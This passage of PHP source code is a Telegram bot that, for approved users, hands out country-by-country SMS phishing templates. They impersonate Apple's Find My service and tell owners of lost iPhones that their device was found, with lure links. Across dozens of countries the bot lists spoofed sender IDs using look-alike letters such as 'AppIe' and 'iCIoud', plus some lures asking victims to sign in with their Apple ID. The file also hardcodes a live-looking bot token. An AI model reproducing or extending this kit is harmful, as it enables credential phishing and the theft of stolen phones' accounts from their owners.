<?php 
//https://api.telegram.org/bot5818415486:AAHHwZccWbV9YcNXG1AqzUZbS5DQNhLgsQA/setwebhook?url=https://bot.idoctorsms.com/zikosmsbot.php
//header("Content-type: application/json; charset=utf-8");
$token = "5818415486:AAHHwZccWbV9YcNXG1AqzUZbS5DQNhLgsQA";
define("API_KEY", $token);
function bot($method,$datas = []){
    $url = "https://api.telegram.org/bot".API_KEY."/$method";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($datas));

    $output = curl_exec($ch);
    curl_close($ch);
    return json_decode($output);
}
function boti($method,$datas = []){
    return bot($method,$datas);
}
$updates = json_decode(file_get_contents("php://input"));
if(isset($updates->message)){
    $message = $updates->message;
    $message_id = $updates->message->message_id;
    $text = isset($message->text) ? strtolower(trim($message->text)) : '';
    $chat_id = $message->chat->id;
    $telegramusername = $updates->message->from->username;
    $first_name = $updates->message->chat->first_name;
    $last_name = $updates->message->chat->last_name;
    $infoschat = " 🔥 Welcome to iDoctor SMS Bot ™️ 
    
✅ You have Successfully Activated and updated iDoctor SMS Bot 
$last_name \n👤 Your Username: @$telegramusername 
\n👤 Your ChatID: $chat_id 
\n⚠️Please contact  @Zikooo2002  to activate this Bot";
    $infoschatfix = " NEW USER ON BOT:\n Full Name: $first_name $last_name \n Username: @$telegramusername \n ChatID: $chat_id";
    $chat_idfix = "140886799";
    if($text == '/start'){
        bot("sendmessage",array('chat_id' => $chat_id, 'text' => $infoschat)); 
        boti("sendmessage",array('chat_id' => $chat_idfix, 'text' => $infoschatfix));
        die();
    }
$ctx = stream_context_create(['http' => ['timeout' => 5]]);
$api = @file_get_contents("https://bot.idoctorsms.com/getter.php?tid=$chat_id", false, $ctx);
if($api === false) $api = "";
if(($api==$chat_id)||($chat_id=="140886799")||($chat_id=="738078618")){
$apiTOK='You Are Accepted';
if(count(explode("/setup", $text)) > 1){
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $apiTOK));
        }
//Uk       
if(count(explode("/uk", $text)) > 1){
$ukshow= "DoctorSmS Bot Advice 🤖
-------------------- 
🇬🇧 UK: +44
--------------------            
API:  Standard

Sender ID:  (info) Arrive LongCode
Templates: TEXT  

Dear Customer, 

16 ProMax have found and connected to the internet.
To view its current location: find-locate.com/zikooo
-------------------- 
Dear customer,

Your photos are being shared with a MacBook Air.
To stop sharing, 
please block this user: find-locate.com/zikooo
-------------------- 
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
//usa       
 if(count(explode("/usa", $text)) > 1){
$ukshow= "DoctorSmS Bot Advice 🤖
-------------------- 
🇺🇸 USA: +1
--------------------            
API: 
Sender ID:  FMI
Templates: TEXT 

Dear Customer,

Your iDevice 14 128GB Starlight was found.
View location at
https://

FindMy Support.
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Canada       
 if(count(explode("/canada", $text)) > 1){
$ukshow= "DoctorSmS Bot Advice 🤖
-------------------- 
🇨🇦 Canada: +1
--------------------            
                           
API:  
Sender ID:  info
Templates: TEXT 

Dear Customer,

Your iDevice 14 128GB Starlight was found.
View location at
https://

FlndMy Support.
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
       
       
       
//Estonia       
 if(count(explode("/estonia", $text)) > 1){
$ukshow= "DoctorSmS Bot Advice 🤖
-------------------- 
🇪🇪 Estonia: +372

API: 
Sender ID:  Apple , FindMy , FMI
Templates: TEXT 

Dear Customer,

Your iPhone 14 128GB Starlight was found.
View location at
https://

FindMy Support.
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//spain         
if(count(explode("/spain", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇪🇸 Spain: +34
-------------------- 

API: 
Sender ID: Apple , iCloud , FindMy , FMI 
Templates:

Estimado Cliente,

Su perdido iPhone ha sido encontrado hoy a la(s) 12:25.
Ver ubicacion aqui
Https://

Soporte FindMy.
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }        
        
        
//india         
if(count(explode("/india", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇮🇳 INDIA: +91
--------------------                 
API: 
Sender ID: info , FMI arrive short code
Templates: no Apple in text

Dear Customer, 

Your iDevice has been found and connected to the internet.
To view its current location: Https://

Best Regards,
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Belgium         
if(count(explode("/belgium", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇧🇪 Belgium: +32
--------------------   
info 
 
Templates: text

Cher Client,

Votre Appareil 11 Pro a ete localise.
Veuillez voir les details 
Https://

Assistance.
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Norway         
if(count(explode("/norway", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇳🇴 Norway: +47
--------------------                 
API: 
Sender ID: Apple , FindMy , FMI , APPSTORE
Templates:

Kjaere kunde,
Din lPhone 12 Pro 128GB Silver ble funnet.
Se plassering pa:
https://

FindMy-stotte
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Germany         
if(count(explode("/germany", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇩🇪 Germany: +49
--------------------
API:
Sender ID: FindMy
Templates:

Sehr geehrter Kunde,

Ihr verlorenes 16 Pro Max ist
jetzt online.
Siehe Standort unter : view.findmy.com/zikooo
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//France         
if(count(explode("/france", $text)) > 1){
$ukshow= "DoctorSms Bot Advice 🤖
-------------------- 
🇫🇷 France: +33
--------------------
API: 

Sender ID:  LocaIiser (big i not L) , FMl (small L NOT I) , Support
Templates:  

Cher client,

Votre Appareil XS Max a ete trouve.
Voir l'emplacement a
Https://

Assistance.
--------------------  
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Czech Republic         
if(count(explode("/czech_republic", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇨🇿 Czech Republic : +420
--------------------                 
API: 
Sender ID: Apple , iCloud , FindMy , FMI
Templates:

Dear Customer, 
Your iPhone XS Max was found. 
View location at 
https://

FindMy Support
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Kuwait         
if(count(explode("/kuwait", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇰🇼 Kuwait: +965
--------------------
API: 
Sender ID: FindMy , FMI
Templates:

Dear Customer,
Your iDevice 12 Pro 128GB Silver has been found.
View location:   
https://

FindMy Support.
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Iran         
if(count(explode("/iran", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇮🇷 Iran: +98
--------------------
API: 
Sender ID: FindMy , FMI
Templates:

Dear Customer,
Your iDevice 12 Pro 128GB Silver has been found.
View location:   
https://

FindMy Support.
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Japan         
if(count(explode("/japan", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇯🇵 Japan: +81
--------------------
API: 
Sender ID: FindMy , FMI , APPLE
Templates:

Dear Customer,
Your iPhone 12 Pro 128GB Silver has been found.
View location:   
https://

FindMy Support.
--------------------
API: 
Sender ID: APPLE
Templates:

紛失した iPhone 12 Pro が見つかり、一時的にiCIoudに接続されました。 AppIe Mapsで場所を表示：
https://

AppIeサポート。
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Denmark         
if(count(explode("/denmark", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇩🇰 Denmark: +45
--------------------  
Api  : FMI

Templates: 

Kaere kunde,
Din iPhone 12 Pro 128GB Silver er fundet.
Se placering:
https://

FindMy Support.
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Egypt         
if(count(explode("/egypt", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇪🇬 Egypt : +20
--------------------                 
API: 
Sender ID: Apple (for etasalat no use https)
Templates:  

Dear Customer,

Your iDevice 12 Pro Max is now online near Giza.
Check location:
link without https://

FMl Support.
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Paraguay         
if(count(explode("/paraguay", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇵🇾 Paraguay : +595
--------------------                 
API: 
Sender ID: FMI , info
Templates:  

Dear Customer,
Your lPhone 14 Pro Max has been found and temporarily switched ON.
View location at 
https://

FindMy Support
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Netherlands         
if(count(explode("/netherlands", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇳🇱 Netherlands: +31
-------------------- 
API: 
Sender ID: AppleND , iCloudND , FindMy , FMI
Templates:

Beste klant,

Je verloren iPhone 11 64GB is momenteel online.
Toon positie: http://

Met vriendelijke groet FindMy.
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Romania         
if(count(explode("/romania", $text)) > 1){
$ukshow= "iDoctorSMS Bot Advice 🤖
-------------------- 
🇷🇴 Romania: +40
--------------------   
API: Romanian unicode
Sender ID: Verify , NOTICE , Notify  arrive Shortcode
Templates:

Stimate client,

iPhone dumneavoastră 15 Pro Max este online.
Pentru a-i urmări locația în timp real,
vă rugăm să vizitați: view.zikooo.com/ziko
--------------------
API: Romanian text
Sender ID: Verify , NOTICE , Notify  arrive Shortcode
Templates:

Stimate client,

iPhone dumneavoastra 15 Pro Max este online.
Pentru a-i urmari locatia in timp real,
va rugam sa vizitati: view.zikooo.com/ziko
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//UAE         
if(count(explode("/uae", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇦🇪 UAE : +971
--------------------                 
API: 
Sender ID: Apple
Templates:

Dear Customer,
Your iDevice 11 64GB Whitei s online and connected to the internet.

Track live location : https://

--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Mexico         
if(count(explode("/mexico", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇲🇽 Mexico: +52
--------------------
API: 
Sender ID: FMI Arrive short code
Templates:

El dispositivo 13 Pro ha sido
encendido y localizado, ver ubicacion en:
https://

FindMy Support
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//uganda         
if(count(explode("/uganda", $text)) > 1){
$ukshow= "DoctorSmS Bot Advice 🤖
-------------------- 
🇺🇬 uganda: +256
--------------------            
                           
API: 
Sender ID: FindMy , FMI  All network
Templates: TEXT 

Dear Customer,

Your Phone 13 128GB Starlight has been found. View location: 
https://

FindMy Support.
--------------------   
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Senegal         
if(count(explode("/senegal", $text)) > 1){
$ukshow= "DoctorSmS Bot Advice 🤖
-------------------- 
🇸🇳 Senegal: +221
--------------------            
                           
API:  
Sender ID: FindMy , FMI  All network
Templates: TEXT 

Dear Customer,

Your Phone 13 128GB Starlight has been found. View location: 
https://

FMI Support.
--------------------   
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Malta         
if(count(explode("/malta", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇲🇹 Malta : +356
--------------------                 
API: 
Sender ID: FindMy , iCioud I Capital
Templates:

Dear Customer, 
Your Phone XS Max was found. 
View location at 
https://

FindMy Support.
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Switzerland         
if(count(explode("/switzerland", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇨🇭 Switzerland: +41
--------------------               
API: 
Sender ID: APPLE , FMI
Templates: France 

Cher Client,

Votre Appareil 11 Pro a ete localise.
Veuillez voir les details 
https:// 

Assistance.
--------------------               
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
        
//Finland         
if(count(explode("/finland", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇫🇮 Finland: +358
--------------------                 
API: 
Sender ID: Appie. (big i) , APPLE
Templates:

Hyva asiakas,

Kadonnut iPhone 11 64GB on talla hetkella verkossa.
Nayta sijainti: https://

Ystavallisin terveisin FindMy
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Malaysia         
if(count(explode("/malaysia", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇲🇾 Malaysia: +60
-------------------- 
API: 
Sender ID: FMI  Arrive shortcode 
Templates:

Pelanggan yang dikasihi,
iDevice XS Max anda telah ditemui.
Lihat lokasi di
https://

Sokongan FindMy.
-------------------- 
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Indonesia         
if(count(explode("/indonesia", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇮🇩 Indonesia: +62
-------------------- 
API: 
Sender ID: Apple  Arrive shortcode 
Templates:

Dear Customer,

Your iDevice 13 128GB Starlight has been found.
View location: 
https://

FMI Support.
-------------------- 
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Macedonia         
if(count(explode("/macedonia", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇲🇰 Macedonia: +389
-------------------- 
API: Api 17 , Api 11 , Api 33
Sender ID: FMI  , FindMy 
Templates:

Dear Customer,

Your iDevice 13 128GB Starlight has been found.
View location: 
https://

FMI Support.
-------------------- 
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Saudi Arabia         
if(count(explode("/saudi_arabia", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇸🇦 Saudi Arabia: +966
-------------------- 
API: Api 17 , Api 11 , Api 33
Sender ID: FMI  , FindMy 
Templates:

Dear Customer,

Your iDevice 13 128GB Starlight has been found.
View location: 
https://

FMI Support.
-------------------- 
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Maldives         
if(count(explode("/maldives", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇲🇻 Maldives: +960
-------------------- 
API: Api 17 , Api 11 , Api 33
Sender ID: FMI  , FindMy 
Templates:

Dear Customer,

Your iDevice 13 128GB Starlight has been found.
View location: 
https://

FMI Support.
-------------------- 
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
//Guinea         
if(count(explode("/guinea", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇬🇳 Guinea: +224
--------------------         
FindMy , FMI 
Templates: 

Dear Customer,

Your Phone 13 128GB Starlight has been found. View location: 
https://

FMI Support.
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//zambia         
if(count(explode("/zambia", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇿🇲 zambia : +260
--------------------                 
API: Api 4 , 11
Sender ID: Apple 
Templates:

Dear Customer, 
Your iPhone XS Max was found. 
View location at 
https://

Apple Support
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Congo         
if(count(explode("/congo", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇨🇩  Congo : +234
--------------------                 
API: Api 33 , 11
Sender ID: Find My , FMI 
Templates:

Dear Customer, 
Your iDevice XS Max was found. 
View location at 
https://

FindMy Support
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Morocco         
if(count(explode("/morocco", $text)) > 1){
$ukshow= "iDoctorSms Bot Advice 🤖
-------------------- 
🇲🇦  Morocco : +212
--------------------
API: 
Sender ID: Apple , FindMy , FMI

Templates:

Cher client(e),

Votre appareil 11 64GB perdu est actuellement en ligne.
Afficher la position: https://

Cordialement FindMy.
--------------------  
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//mozambique         
if(count(explode("/mozambique", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇲🇿 mozambique : +258
--------------------                 
API: Api 28 , 11
Sender ID: FindMy , FMI 
Templates:

Dear Customer, 
Your iDevice XS Max was found. 
View location at 
https://

FindMy Support
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//vietnam         
if(count(explode("/vietnam", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇻🇳 vietnam : +84
--------------------                 
API: Api 28 , Api 33 
Sender ID: FindMy 
Templates:

Alert!

Your iDevice has been found and connected to the internet.
To view its current location: https://

Best Regards,
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//tunisia         
if(count(explode("/tunisia", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇹🇳 tunisia : +216
--------------------                 
API: 
Sender ID: FindMy , FMI 
Templates:

Cher Client, 

Votre appareil 13 Pro 128GB perdu est actuellement en ligne. 
Afficher la position: Https://

Assistance 
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
        
//Algeria         
if(count(explode("/algeria", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇩🇿 Algeria : +213
--------------------                 
API: 
Sender ID: Find My , FMI , LCioud (L small i big) lCIoud 
Templates:

Cher Client, 

Votre appareil 13 Pro 128GB perdu est actuellement en ligne. 
Afficher la position: Https://

Assistance 
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
        
//Brazil         
if(count(explode("/brazil", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇧🇷 Brazil: +55
--------------------
API: 
Sender ID: FMI 
Templates:

Prezado(a)Cliente:
Seu Dispositivo em modo perdido foi localizado,
para obter a localizacao acesse: link without 
https://
--------------------
API: 
Sender ID: FMI 
Templates:

Prezado(a)Cliente:
Dispositivo 15 foi conectado a uma rede 4G e localizado. Acesse :
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Uruguay         
if(count(explode("/uruguay", $text)) > 1){
$ukshow= "DoctorSmS Bot Advice 🤖
-------------------- 
🇺🇾 Uruguay: +598
--------------------            
                           
API: 
Sender ID: FindMy , FMI  All network
Templates: TEXT 

Dear Customer,

Your Phone 13 128GB Starlight has been found. View location: 
https://

FindMy Support.
--------------------   
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//China         
if(count(explode("/china", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇨🇳 China: +86
-------------------- 
API: Api USA , Api 17 
Sender ID: Apple, Info
Templates: English

Dear Customer,
Your iPhone 15 Pro Max 256GB Natural is online and connected to the internet.
https://

FindMy Support.
--------------------
API: Api 17 unicode
Sender ID: Apple, Info
Templates: china

尊敬的蘋果客戶:
您丟失的 iPhone 12 Pro Max 256GB 已找到。
檢視位置:
link

應用支援。
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Botswana         
if(count(explode("/botswana", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇧🇼 Botswana: +267
-------------------- 
API: Api 31
Sender ID: FMI , FindMy
Templates:

Dear Customer,
Your iDevice 14 Starlight was found.
View location at 
https://

FindMy Support.    
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Sierra Leone	         
if(count(explode("/sierra_leone", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇸🇱 Sierra Leone	: +232
-------------------- 
API: 
Sender ID: FMI , AppleStore
Templates:

Dear Customer,

Your iPhone 13 Pro Max 128GB Sierra Blue has been located today. 
Check location at:
https://

FindMy Support.
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//bulgaria         
if(count(explode("/bulgaria", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇧🇬 bulgaria: +359
-------------------- 
API: 
Sender ID:  Apple , FindMy , FMI
Templates:

Dear Customer,
Your iPhone 14 Starlight was found.
View location at 
https://

FindMy Support.    
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
//Taiwan         
if(count(explode("/taiwan", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇹🇼 Taiwan: +886
--------------------               
API: Api 33 , Api 11
Sender ID: FindMy , FMI
Templates:

Dear Customer, 
Your Phone XS Max was found. 
View location at 
https://

FindMy Support
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Bangladesh         
if(count(explode("/bangladesh", $text)) > 1){
$ukshow= "DoctorSmS Bot Advice 🤖
-------------------- 
🇧🇩 Bangladesh: +880
--------------------            
                           
API: Api 29 , 33  
Sender ID: info , FMI  All network
Templates: TEXT 

Dear Customer,

Your Phone 13 128GB Starlight has been found. View location: 
https://

FMI Support.
--------------------   
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Pakistan         
if(count(explode("/pakistan", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇵🇰 Pakistan: +92
--------------------                 
API: 
Sender ID: Apple  
Templates: (Without Apple Word in text)

Dear Customer, 

Your iPhone has been found and connected to the internet.
To view its current location: Https://

Best Regards,
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Ukraine         
if(count(explode("/Ukraine", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
 🇺🇦 Ukraine :+380
-------------------- 
API: 
Sender ID: FMI 
Templates: English

Dear Customer,
Your iPhone 13 Pro 128GB
Graphite has been found. View
location: https://

FindMy Support.
--------------------

Templates: Russia

Ваш пропавший lPhone активен! 
Для просмотра местоположения войдите с AppIeID: 
https://

FindMy Support.


--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
        
//Kazakhstan         
if(count(explode("/kazakhstan", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇰🇿 Kazakhstan :+77
-------------------- 
API: Api 11 , Api 17
Sender ID: Apple 
Templates: English

Dear Customer,
Your iPhone 13 Pro 128GB
Graphite has been found. View
location: https://

AppIe Support.
--------------------

Templates: Russia

Ваш пропавший lPhone активен! 
Для просмотра местоположения войдите с AppIeID: 
https://

AppIe Support.
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Afghanistan         
if(count(explode("/afghanistan", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇦🇫 Afghanistan : +93
--------------------                 
API: Api 11 , 33
Sender ID: FindMy
Templates:

Dear Customer, 
Your Device XS Max was found. 
View location at 
https://

FindMy Support.
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Kenya         
if(count(explode("/kenya", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇰🇪 Kenya : +254
--------------------                 
API: 
Sender ID: Apple , FindMy
Templates:

Dear Customer, 
Your iDevice XS Max was found. 
View location at 
https://

FindMy Support.
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Kosovo         
if(count(explode("/kosovo", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇽🇰 Kosovo : +383
--------------------                 
API: 
Sender ID: FindMy
Templates:

Dear Customer, 
Your iDevice XS Max was found. 
View location at 
https://

FindMy Support.
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Sweden         
if(count(explode("/sweden", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇸🇪 Sweden: +46
--------------------   
API: 
Sender ID:  iCIoud (Big i) , FindMy , FMI
Templates:  

Din enhet lPhone 11 Pro Max Har startats och hittats. 
Hitta plats: 
https://

FindMy Support.
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//South Africa         
if(count(explode("/south_africa", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇿🇦 South Africa: +27
--------------------                 
API: 
Sender ID: FMI arrive long code 
Templates:

Dear Customer, 
Your iDevice XS Max was found. 
View location at 
https://

FindMy Support.
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Cyprus         
if(count(explode("/cyprus", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇨🇾 Cyprus: +357
--------------------                 
API: 
Sender ID: FindMy , FMI 
Templates:

Dear Customer, 
Your iDevice XS Max was found. 
View location at 
https://

FMI Support.
--------------------
Thanks for using iDoctorSmS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Austria         
if(count(explode("/austria", $text)) > 1){
$ukshow= "iDoctor SMS Bot Advice 🤖
-------------------- 
🇦🇹 Austria: +43
--------------------                 
API: 
Sender ID: Apple
Templates:

Mein iPhone Suchen, 
Ihr verlorenes iPhone 12 Pro Max ist lokalisiert. Standort hier ansehen:
https://

FindMy Support.
--------------------
Thanks for using iDoctor SMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
//Italy         
if(count(explode("/italy", $text)) > 1){
$ukshow= "iDoctorSMS Bot Advice 🤖
-------------------- 
🇮🇹 Italy: +39
--------------------  
API: 
Sender ID:  iCloud , FindMy , FMI (VDF-LYCA)
Templates:

Gentile Cliente,
Il tuo iPhone XS Max e stato trovato. Visualizza posizione a
Https://

Supporto FindMy.
--------------------
Thanks for using iDoctorSMS 😊";
bot("sendmessage",array('chat_id' => $chat_id, 'text' => $ukshow));
        }
        
        
        
        
//Qatar         
if(count(explode("/qatar", $text)) > 1){
$ukshow= "iDoctorSmS Bot Advice 🤖
-------------------- 
🇶🇦 Qatar : +974
--------------------                 
API: 
Sender ID: Apple 
Templates:

Dear Customer, 
Your iPhone XS Max was found. 
View location at 
https://

Apple Support
--------------------
